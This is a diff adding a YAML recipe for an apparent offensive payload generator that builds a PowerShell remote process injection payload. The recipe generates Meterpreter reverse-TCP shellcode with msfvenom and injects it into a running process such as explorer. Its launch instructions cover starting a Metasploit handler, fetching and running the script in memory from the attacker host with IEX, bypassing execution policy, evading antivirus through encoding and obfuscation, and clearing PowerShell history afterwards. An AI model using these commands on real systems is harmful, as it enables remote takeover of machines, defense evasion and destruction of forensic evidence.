@@ -1,0 +1,163 @@
+meta:
+  name: "Remote Process Injection (PowerShell)"
+  category: "Process Injection"
+  description: |
+    PowerShell-based remote process injection using classic CreateRemoteThread technique.
+    
+    Features:
+    - Dynamic API resolution via reflection (no direct P/Invoke)
+    - Targets any running process by name
+    - Uses UnsafeNativeMethods to access Windows APIs
+    - Classic injection pattern: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
+    
+    This technique is useful for environments where PowerShell is available but
+    compiled executables are restricted. The script uses reflection to dynamically
+    resolve Windows API functions, avoiding static signatures.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: medium
+
+  mitre:
+    tactic: "TA0005 - Defense Evasion"
+    technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"
+
+  artifacts:
+    - "PowerShell execution with suspicious scripts"
+    - "OpenProcess API calls with PROCESS_ALL_ACCESS"
+    - "VirtualAllocEx with PAGE_EXECUTE_READWRITE permissions"
+    - "WriteProcessMemory API calls"
+    - "CreateRemoteThread API calls"
+    - "Network connection to C2 server"
+    - "Suspicious memory regions in target process"
+    - "Reflection-based API resolution patterns"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "target_process"
+    type: "string"
+    description: "Target process name (without .exe extension)"
+    required: false
+    default: "explorer"
+
+  - name: "output_file"
+    type: "string"
+    description: "Output PowerShell script filename"
+    required: false
+    default: "injector.ps1"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: Format shellcode as PowerShell byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_powershell.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "powershell_payload"
+
+output:
+  type: "template"
+  template: "process_injection/powershell_remote_inject.ps1"
+  compile:
+    enabled: false
+  launch_instructions: |
+    PowerShell Remote Process Injection - Launch Instructions
+
+    Step 1: Start Metasploit Listener
+
+    Start msfconsole and configure the handler:
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Or manually in msfconsole:
+
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST {{ lhost }}
+    set LPORT {{ lport }}
+    set ExitOnSession false
+    exploit -j
+
+    Step 2: Transfer Script to Target
+
+    Transfer the generated PowerShell script to the target Windows system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target (PowerShell):
+    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+
+    Step 3: Execute on Target
+
+    Run the PowerShell script with execution policy bypass:
+
+    powershell.exe -ExecutionPolicy Bypass -File {{ output_file }}
+
+    Or use dot-sourcing:
+    powershell.exe -ExecutionPolicy Bypass -Command ". .\{{ output_file }}"
+
+    Or download and execute in memory (fileless):
+    powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
+
+    Step 4: Verify Connection
+
+    Check your Metasploit console for incoming session:
+    Sending stage (200262 bytes) to [target_ip]
+    Meterpreter session 1 opened
+
+    Notes:
+
+    - Target process: {{ target_process }} (must be running on target system)
+    - Uses reflection to dynamically resolve Windows API functions
+    - No static P/Invoke signatures (helps evade some AV)
+    - EXITFUNC=thread ensures clean exit without crashing target process
+    - PowerShell execution may be logged by Windows Event Logs
+    - Consider obfuscating the script for additional evasion
+
+    Troubleshooting:
+
+    - If injection fails: Verify target process is running: Get-Process {{ target_process }}
+    - If process not found: Try different target (notepad, chrome, etc.)
+    - If no connection: Check firewall rules on attacker machine
+    - If AV blocks: Consider script obfuscation or encoding
+    - Requires matching architecture (x64 payload for x64 process)
+    - May need administrative privileges depending on target process
+
+    Alternative Execution Methods:
+
+    Encoded command (helps bypass simple AV):
+    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content {{ output_file }} -Raw)))
+    powershell.exe -EncodedCommand $encoded
+
+    Cleanup:
+
+    After testing, remove the script:
+    Remove-Item {{ output_file }} -Force
+
+    Clear PowerShell history:
+    Remove-Item (Get-PSReadlineOption).HistorySavePath
